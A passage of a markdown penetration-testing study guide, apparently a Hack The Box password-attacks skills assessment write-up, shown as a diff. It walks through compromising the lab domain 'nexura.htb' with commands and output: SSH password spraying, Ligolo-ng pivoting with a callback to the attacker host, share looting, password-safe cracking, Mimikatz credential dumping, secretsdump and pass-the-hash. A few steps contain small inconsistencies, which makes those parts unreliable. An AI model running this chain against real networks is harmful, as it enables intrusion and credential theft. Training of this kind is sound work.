@@ -6240,4 +6240,771 @@ There are many options available for protecting passwords. Choosing the right on
 
 ---
 
+<details>
+<summary><h1>📝 Practical Example</h1></summary>
+
+<details>
+<summary><h2>The Credential Theft Shuffle</h2></summary>
+
+[The Credential Theft Shuffle](https://adsecurity.org/?p=2362), as coined by Sean Metcalf, is a systematic approach attackers use to compromise Active Directory environments by exploiting stolen credentials. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to move laterally across the network. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and gain control over the domain, often by compromising Domain Admin accounts or performing DCSync attacks. Sean emphasizes the importance of implementing security measures such as the Local Administrator Password Solution (LAPS), enforcing multi-factor authentication, and restricting administrative privileges to mitigate such attacks.
+
+</details>
+
+<details>
+<summary><h2>Skills Assessment</h2></summary>
+
+<details>
+<summary><h3>Context</h3></summary>
+
+**Betty Jayde** works at **Nexura LLC.** We know she uses the password **`Texas123!@#`** on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:
+
+| Host   | IP Addresses                     |
+|--------|----------------------------------|
+| **DMZ01**  | 10.129.234.116 (External), 172.16.119.13 (Internal) |
+| **JUMP01** | 172.16.119.7                     |
+| **FILE01** | 172.16.119.10                    |
+| **DC01**   | 172.16.119.11                    |
+
+**Pivoting Primer**
+
+The internal hosts (**JUMP01**, **FILE01**, **DC01**) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is **DMZ01**, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.
+
+To access these internal systems, we must first gain a foothold on **DMZ01**. From there, we can **pivot** — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible.
+
+> **Challenge:** What is the NTLM hash of NEXURA\Administrator?
+
+</details>
+
+<details>
+<summary><h3>Process</h3></summary>
+
+<details>
+<summary><h4>Step 1. Initial Credential Harvesting</h4></summary>
+
+<details>
+<summary><h5>Step 1.1 Generate Username Candidates</h5></summary>
+
+**(ATTACK HOST) Create a target name file and verify:**
+
+```bash
+echo "Betty Jayde" > ~/name.txt
+```
+
+**(ATTACK HOST) Confirm**
+
+```bash
+cat ~/name.txt
+```
+
+**Expected Output**
+
+```bash
+# Betty Jayde
+```
+
+**(ATTACK HOST) Intall [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)**
+
+```bash
+git clone https://github.com/urbanadventurer/username-anarchy.git
+cd username-anarchy
+chmod +x username-anarchy
+```
+
+**(ATTACK HOST) Generate usernames**
+
+```bash
+./username-anarchy -i ~/names.txt > ~/usernames.txt
+```
+
+**(ATTACK HOST) Confirm**
+
+```bash
+cat ~/usernames.txt
+```
+
+**Expected Output**
+
+```bash
+# betty
+# bettyjayde
+# betty.jayde
+# bettyjay
+# bettjayd
+# bettyj
+# b.jayde
+# bjayde
+# jbetty
+# j.betty
+# jaydeb
+# jayde
+# jayde.b
+# jayde.betty
+# bj
+```
+
+</details>
+
+<details>
+<summary><h5>Step 1.2 Brute-Force SSH Access</h5></summary>
+
+**(ATTACK HOST) Run Hydra against the target:**
+
+```bash
+hydra -L ~/usernames.txt -p 'Texas123!@#' ssh://10.129.234.116
+```
+
+**Success Output:**
+
+```bash
+# [22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h4>Step 2. Internal Network Pivoting</h4></summary>
+
+<details>
+<summary><h5>Step 2.1 Configure Pivot Access</h5></summary>
+
+**(ATTACK HOST) Add to `/etc/proxychains.conf`:**
+
+```bash
+echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
+```
+
+**(ATTACK HOST) Establish SSH tunnel:**
+
+```bash
+ssh -D 1080 jbetty@10.129.234.116
+```
+
+</details>
+
+<details>
+<summary><h5>Step 2.2 Internal Enumeration</h5></summary>
+
+**(DMZ01) Check history**
+
+```bash
+history
+```
+
+**Example output**
+
+```bash
+# ...
+# 24  htop
+# 25  sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
+# 26  ls
+# ...
+```
+
+</details>
+
+<details>
+<summary><h5>Step 2.3 Access Internal SMB Shares</h5></summary>
+
+**(ATTACK HOST) List shares via ProxyChains:**
+
+```bash
+proxychains smbclient -L //172.16.119.10 -U NEXURA/hwilliam
+```
+
+**Expected output**
+
+```bash
+# [proxychains] config file found: /etc/proxychains.conf
+# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+# [proxychains] DLL init: proxychains-ng 4.16
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
+# Password for [NEXURA\hwilliam]:
+
+# 	Sharename       Type      Comment
+# 	---------       ----      -------
+# 	ADMIN$          Disk      Remote Admin
+# 	C$              Disk      Default share
+# 	HR              Disk      
+# 	IPC$            IPC       Remote IPC
+# 	IT              Disk      
+# 	MANAGEMENT      Disk      
+# 	PRIVATE         Disk      
+# 	TRANSFER        Disk      
+# Reconnecting with SMB1 for workgroup listing.
+```
+
+**(ATTACK HOST) Download HR share:**
+
+```bash
+proxychains smbget -R smb://172.16.119.10/HR -U NEXURA/hwilliam
+```
+
+**Example Output**
+
+```bash
+# [proxychains] config file found: /etc/proxychains.conf
+# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+# [proxychains] DLL init: proxychains-ng 4.16
+# Password for [NEXURA/hwilliam] connecting to //172.16.119.10/HR: 
+# Using workgroup WORKGROUP, user NEXURA/hwilliam
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.10:445  ...  OK
+# smb://172.16.119.10/HR/2024/Annual Review Template.doc                                              
+# smb://172.16.119.10/HR/2024/Candidate Screening Logs.xlsx                                           
+# smb://172.16.119.10/HR/2024/Code of Conduct.xlsx                  
+# ...
+# Downloaded 74.58MB in 117 seconds
+```
+
+During the SMB share download, several backup files were retrieved that may contain valuable credentials.
+
+**Review downloaded files for credentials:**
+
+```bash
+ls HR/Archive/
+```
+
+**Expectd Output:**
+
+```bash
+# ...
+#  Employee-Passwords_OLD_011.ibak
+#  Employee-Passwords_OLD_012.ibak
+#  Employee-Passwords_OLD_013.ibak
+#  Employee-Passwords_OLD.plk
+#  Employee-Passwords_OLD.psafe3'
+# ...
+```
+
+</details>
+
+<details>
+<summary><h5>Step 2.4 Crack Password Database</h5></summary>
+
+After reviewing the file, the most promesing was the .psafe3 file:
+
+```bash
+pwsafe2john Employee-Passwords_OLD.psafe3 > psafe.hash
+```
+
+**Crack the hash**
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
+```
+
+**Expected Output**
+
+```bash
+# Created directory: /home/htb-ac-1640397/.john
+# Using default input encoding: UTF-8
+# Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
+# Cost 1 (iteration count) is 262144 for all loaded hashes
+# Will run 4 OpenMP threads
+# Press 'q' or Ctrl-C to abort, almost any other key for status
+# michaeljackson   (Employee-Passwords_OLD)     
+# 1g 0:00:00:34 DONE (2025-08-08 12:01) 0.02869g/s 352.5p/s 352.5c/s 352.5C/s total90..hawkeye
+# Use the "--show" option to display all of the cracked passwords reliably
+# Session completed. 
+```
+
+Now, we can open the file using the master password:
+
+**Install pwsafe**
+
+```bash
+sudo apt install pwsafe
+```
+
+**Open the file**
+
+```bash
+pwsafe Employee-Passwords_OLD.psafe3
+```
+
+Extracted credentials:
+
+* DMZ01
+    * Betty Jayde 
+        * Username: `jbetty`
+        * Password: `<JBETTY_CLEARTEXT_PASSWORD>`
+* Domain Users
+    * David Brittni
+        * Username: `bdavid`
+        * Password: `<BDAVID_CLEARTEXT_PASSWORD>`
+    * Tom Sandy
+        * Username: `stom`
+        * Password: `<STOM_CLEARTEXT_PASSWORD>`
+    * William Hallam
+        * Username: `hwilliam`
+        * Password: `<HWILLIAM_CLEARTEXT_PASSWORD>`
+
+</details>
+
+</details>
+
+<details>
+<summary><h4>Step 3. Set Up Ligolo-ng Tunnel</h4></summary>
+
+<details>
+<summary><h5>Step 3.1. Configure Ligolo Proxy (Attack Host)</h5></summary>
+
+**(ATTACK HOST) Download Ligolo-ng proxy binary, extract it and make it executable**
+
+```bash
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+tar xvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+chmod +x proxy
+```
+
+**(ATTACK HOST) Start the Ligolo proxy with self-signed certificate**
+
+```bash
+sudo ./proxy -selfcert
+```
+
+**Expected output**
+
+```bash
+#     __    _             __                       
+#    / /   (_)___ _____  / /___        ____  ____ _
+#   / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+#  / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+# /_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+#         /____/                          /____/   
+
+#   Made in France ♥            by @Nicocha30!
+#   Version: 0.8.2
+
+# ligolo-ng »  
+```
+
+</details>
+
+<details>
+<summary><h5>Step 3.2. Deploy Ligolo Agent (DMZ01)</h5></summary>
+
+**(DMZ01) Create temporary directory for Ligolo files**
+
+```bash
+mkdir /tmp/ligolo/
+```
+
+**(ATTACK HOST) Download and transfer agent to compromised host**
+
+```bash
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
+scp ligolo-ng_agent_0.8.2_linux_amd64.tar.gz jbetty@10.129.234.116:/tmp/ligolo/
+```
+
+**(DMZ01) Extract and prepare the agent:**
+
+```bash
+cd /tmp/ligolo/
+tar xvf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
+chmod +x agent
+```
+
+**(DMZ01) Start the Agent:**
+
+```bash
+./agent -connect 10.10.14.194:11601 -ignore-cert
+```
+
+**(DMZ01) Expected output**
+
+```bash
+# WARN[0000] warning, certificate validation disabled     
+# INFO[0000] Connection established                        addr="10.10.14.194:11601"
+```
+
+**(ATTACK HOST) Expected Output**
+
+```bash
+# ligolo-ng » INFO[0079] Agent joined.                                 id=005056b080ed name=jbetty@DMZ01 remote="10.129.234.116:45422"
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h4>Step 4. Establish and Use Ligolo Tunnel</h4></summary>
+
+<details>
+<summary><h5>Step 4.1. Select Agent Session</h5></summary>
+
+**(ATTACK HOST) (Inside the Ligolo session) List and select active sessions:**
+
+```bash
+ligolo-ng » session
+
+# ? Specify a session :  [Use arrows to move, type to filter]
+# > 1 - jbetty@DMZ01 - 10.129.234.116:45422 - 005056b080ed
+
+ligolo-ng » 1
+
+# jbetty@DMZ01 - 10.129.234.116:45422 - 005056b080ed
+# [Agent : jbetty@DMZ01]
+```
+
+</details>
+
+<details>
+<summary><h5>Step 4.2. Identify Network Interfaces</h5></summary>
+
+**(ATTACK HOST) (Inside the Ligolo session) List available network interfaces on the compromised host**
+
+```bash
+[Agent : jbetty@DMZ01] » ifconfig
+# ┌────────────────────────────────────┐
+# │ Interface 0                        │
+# ├──────────────┬─────────────────────┤
+# │ Name         │ lo                  │
+# │ Hardware MAC │                     │
+# │ MTU          │ 65536               │
+# │ Flags        │ up|loopback|running │
+# │ IPv4 Address │ 127.0.0.1/8         │
+# │ IPv6 Address │ ::1/128             │
+# └──────────────┴─────────────────────┘
+# ┌─────────────────────────────────────────────────┐
+# │ Interface 1                                     │
+# ├──────────────┬──────────────────────────────────┤
+# │ Name         │ ens160                           │
+# │ Hardware MAC │ 00:50:56:b0:80:ed                │
+# │ MTU          │ 1500                             │
+# │ Flags        │ up|broadcast|multicast|running   │
+# │ IPv4 Address │ 10.129.234.116/16                │
+# │ IPv6 Address │ dead:beef::250:56ff:feb0:80ed/64 │
+# │ IPv6 Address │ fe80::250:56ff:feb0:80ed/64      │
+# └──────────────┴──────────────────────────────────┘
+# ┌───────────────────────────────────────────────┐
+# │ Interface 2                                   │
+# ├──────────────┬────────────────────────────────┤
+# │ Name         │ ens192                         │
+# │ Hardware MAC │ 00:50:56:b0:19:28              │
+# │ MTU          │ 1500                           │
+# │ Flags        │ up|broadcast|multicast|running │
+# │ IPv4 Address │ 172.16.119.13/24               │
+# │ IPv6 Address │ fe80::250:56ff:feb0:1928/64    │
+# └──────────────┴────────────────────────────────┘
+```
+
+</details>
+
+<details>
+<summary><h5>Step 4.3. Configure Tunnel Interface</h5></summary>
+
+**(ATTACK HOST) Create tun interface for routing**
+
+```bash
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+```
+
+**(ATTACK HOST) Add route for internal network through the tunnel**
+
+```bash
+sudo ip route add 172.16.119.0/24 dev ligolo
+```
+
+**(ATTACK HOST) Verify route was added**
+
+```bash
+sudo ip route add 172.16.119.0/24 dev ligolo
+```
+
+**Expected Output**
+
+```bash
+# ...
+# 172.16.119.0/24 dev ligolo scope link
+# ...
+```
+
+</details>
+
+<details>
+<summary><h5>Step 4.4. Start the Tunnel</h5></summary>
+
+**(ATTACK HOST) (Inside the Ligolo session) Begin tunneling traffic through the agent**
+
+```bash
+[Agent : jbetty@DMZ01] » start
+# INFO[0871] Starting tunnel to jbetty@DMZ01 (005056b080ed) 
+```
+
+</details>
+
+<details>
+<summary><h5>Step 4.5. Verify Tunnel Connectivity</h5></summary>
+
+**(ATTACK HOST) Test connection to internal host**
+
+```bash
+ping 172.16.119.11
+```
+
+**Expected Output**
+
+```bash
+# PING 172.16.119.11 (172.16.119.11) 56(84) bytes of data.
+# 64 bytes from 172.16.119.11: icmp_seq=1 ttl=64 time=69.8 ms
+# 64 bytes from 172.16.119.11: icmp_seq=2 ttl=64 time=68.2 ms
+# 64 bytes from 172.16.119.11: icmp_seq=3 ttl=64 time=67.9 ms
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h4>Step 5. Domain Credential Enumeration and Lateral Movement</h4></summary>
+
+<details>
+<summary><h5>Step 5.1. Prepare Credential Files for Spraying</h5></summary>
+
+**(ATTACK HOST) Create wordlists for credential spraying attacks against the domain controller:**
+
+```bash
+# Create username list (format: one username per line)
+echo -e "jbetty\nbdavid\nstom\nhwilliam" > domain_usernames.txt
+
+# Create password list (matching order with usernames)
+echo -e "xiao-nicer-wheels5\ncaramel-cigars-reply1\nfails-nibble-disturb4\nwarned-wobble-occur8" > domain_passwords.txt
+```
+
+**Verification:**
+
+```bash
+cat domain_usernames.txt
+# jbetty
+# bdavid
+# stom
+# hwilliam
+
+cat domain_passwords.txt 
+# xiao-nicer-wheels5
+# caramel-cigars-reply1
+# fails-nibble-disturb4
+# warned-wobble-occur8
+```
+
+> **NOTE:** Always verify the files before using them in attacks to ensure proper formatting.
+
+</details>
+
+<details>
+<summary><h5>Step 5.2. Perform Credential Spraying Attack</h5></summary>
+
+**Identify valid domain credentials using CrackMapExec:**
+
+```bash
+crackmapexec smb 172.16.119.11 -u domain_usernames.txt -p domain_passwords.txt --groups 'Domain Admins' --continue-on-success
+```
+
+**Expected Output:**
+
+```bash
+# SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
+# ...
+# SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
+# ...
+```
+
+**Key Findings:**
+
+* Valid credentials found: `bdavid`:`caramel-cigars-reply1`
+* This account has Domain Admins group privileges
+
+**Follow-up Verification:**
+
+```bash
+crackmapexec smb 172.16.119.11 -u 'bdavid' -p 'caramel-cigars-reply1' --groups 'Domain Admins'
+```
+
+**Domain Admin Confirmation:**
+
+```bash
+# SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
+# SMB         172.16.119.11   445    DC01             [+] nexura.htb\bdavid:caramel-cigars-reply1 
+# SMB         172.16.119.11   445    DC01             [+] Enumerated members of domain group
+# SMB         172.16.119.11   445    DC01             nexura.htb\stom
+# SMB         172.16.119.11   445    DC01             nexura.htb\Administrator
+```
+
+</details>
+
+<details>
+<summary><h5>Step 5.3. EvilWinRm and Mimikatz</h5></summary>
+
+**(ATTACK HOST) Download the latest Mimikatz release (ZIP format) from the official repository:**
+
+```bash
+wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
+unzip mimikatz_trunk.zip
+cd x64
+```
+
+**(ATTACK HOST) Start Evil-WinRM via proxychains:**
+
+```bash
+proxychains evil-winrm -i 172.16.119.7 -u 'bdavid' -p 'caramel-cigars-reply1'
+```
+
+**(EVIL-WINRM SESSION) Upload the Mimikatz binary to the target:**
+
+```bash
+*Evil-WinRM* PS C:\Users\bdavid\Documents> upload mimikatz.exe mimikatz.exe
+```
+
+**Expected Output:**
+
+```bash
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
+
+# Data: 239308 bytes of 239308 bytes copied
+
+# Info: Upload successful!
+```
+
+**(EVIL-WINRM SESSION) Run Mimikatz with specific commands:**
+
+```bash
+*Evil-WinRM* PS C:\Users\bdavid\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > mimikatz_output.txt
+```
+
+**(EVIL-WINRM SESSION) Download the output file back to the attack host:**
+
+```bash
+*Evil-WinRM* PS C:\Users\bdavid> download mimikatz_output.txt mimikatz_output.txt
+```
+
+**Expected Output:**
+
+```bash
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.119.7:5985  ...  OK
+                                        
+# Info: Downloading C:\Users\bdavid\mimikatz_output.txt to mimikatz_output.txt
+                                        
+# Info: Download successful!
+```
+
+**(EVIL-WINRM SESSION) Exit the remote shell:**
+
+```bash
+*Evil-WinRM* PS C:\Users\bdavid> exit
+```
+
+**(ATTACK HOST) View the extracted credentials:**
+
+```bash
+cat mimikatz_output.txt
+```
+
+**Expected Output:**
+
+```bash
+# ...
+
+# Authentication Id : 0 ; 222855 (00000000:00036687)
+# Session           : Batch from 0
+# User Name         : stom
+# Domain            : NEXURA
+# Logon Server      : DC01
+# Logon Time        : 8/7/2025 11:23:03 AM
+# SID               : S-1-5-21-1333759777-277832620-2286231135-1106
+# 	msv :	
+# 	 [00000003] Primary
+# 	 * Username : stom
+# 	 * Domain   : NEXURA
+# 	 * NTLM     : <NTLM>
+# 	 * SHA1     : <SHA1>
+# 	 * DPAPI    : <DPAPI>
+# 	kerberos :	
+# 	 * Username : stom
+# 	 * Domain   : NEXURA.HTB
+# 	 * Password : <STOM_CLEARTEXT_PASSWORD>
+# 	ssp :	
+# 	credman :	
+
+# ...
+```
+
+</details>
+
+<details>
+<summary><h5>Step 5.4. Extract Domain Credential Hashes</h5></summary>
+
+**Dump NTDS.dit equivalent data using Domain Admin privileges to obtain password hashes for all domain users.**
+
+```bash
+impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1@172.16.119.11'
+```
+
+```bash
+# Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+# [*] Service RemoteRegistry is in stopped state
+# [*] Starting service RemoteRegistry
+# [*] Target system bootKey: 0x76b4393403c75a0cb93633c17abf2778
+# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+# ...
+```
+
+**Critical Findings:**
+1. **Administrator Hash:**
+```bash
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMINISTRATOR_NTLM_HASH>:::
+```
+
+2. **KRBTGT Account Hash (Golden Ticket potential):**
+```bash
+# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_HASH>:::
+```
+
+3. **All User Hashes:**
+```bash
+# nexura.htb\bdavid:1105:aad3b435b51404eeaad3b435b51404ee:<BDAVID_NTLM_HASH>:::
+# nexura.htb\stom:1106:aad3b435b51404eeaad3b435b51404ee:<STOM_NTLM_HASH>:::
+```
+
+4. **Kerberos Keys:**
+```bash
+# Administrator:aes256-cts-hmac-sha1-96:<ADMINISTRATOR_AES_KEY>
+```
+
+**Use the extracted Administrator hash for validation** (Redacted)
+```bash
+crackmapexec smb 172.16.119.11 -u Administrator -H <ADMINISTRATOR_NTLM_HASH>
+```
+
+**Expected Output:**
+
+```bash
+SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
+SMB         172.16.119.11   445    DC01             [+] nexura.htb\Administrator:<ADMINISTRATOR_NTLM_HASH> (Pwn3d!)
+```
+
+**Next Steps:**
+
+* Create Golden Ticket with krbtgt hash
+* Perform DCSync attacks
+* Begin network-wide compromise using extracted credentials
+
+</details>
+
+</details>
+
+</details>
+
+</details>
+
+</details>
+
+---
+
 📘 **Next step:** Continue with [COMMON SERVICES](./08-common-services.md)
